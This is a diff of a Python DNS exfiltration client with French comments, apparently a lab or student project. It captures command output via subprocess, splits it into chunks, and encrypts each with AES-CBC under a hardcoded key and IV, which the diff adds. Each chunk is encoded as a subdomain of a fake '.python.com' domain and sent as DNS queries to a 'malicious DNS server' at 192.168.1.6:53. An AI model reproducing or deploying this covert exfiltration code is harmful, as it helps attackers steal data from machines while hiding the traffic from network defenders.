@@ -1,13 +1,31 @@
 from dns import resolver
 import subprocess
 import base64
-import time
 from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+
+# Adresse et port du serveur DNS malicieux
+# 192.168.1.6:53
+HOST = '192.168.1.6'
+PORT = 53
+KEY = b'277EED8594C6C65M'
+IV = b'A5E8E95AF2723449'
+
+def encrypt_aes_cbc(key, iv, plaintext):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return base64.b64encode(ciphertext).decode()
+
+def decrypt_aes_cbc(key, iv, ciphertext):
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    decrypted_data = cipher.decrypt(base64.b64decode(ciphertext))
+    
+    return unpad(decrypted_data, AES.block_size).decode()
 
 # division des données retournées par subprocess
 # en bloc de 45 octets, rassemblés dans un tableau
 def chunk(data):
-    chunk_size = 45
+    chunk_size = 31
     chunks = []
 
     # Iterate over the data in chunk_size intervals
@@ -17,9 +35,10 @@ def chunk(data):
         chunk = data[i:i+chunk_size]
 
         # encodage en base64
-        encoded_chunk = base64.b64encode(chunk.encode()).decode()
+        #encoded_chunk = base64.b64encode(chunk.encode()).decode()
 
         # ajout du faux domaine ".python.com"
+        encoded_chunk = encrypt_aes_cbc(KEY, IV, chunk)
 
         # à faire chiffrer en AES (CTR ou CBC)
         encoded_chunk += ".python.com"
@@ -58,11 +77,6 @@ output_string = output_binary.decode()
 data = chunk(output_string)
 # affichage du tableau (debug à supprimer)
 print(data)
-
-# Adresse et port du serveur DNS malicieux
-# 192.168.1.6:53
-HOST = '192.168.1.6'
-PORT = 53
 
 # Créer une instance de resolver
 res = resolver.Resolver()
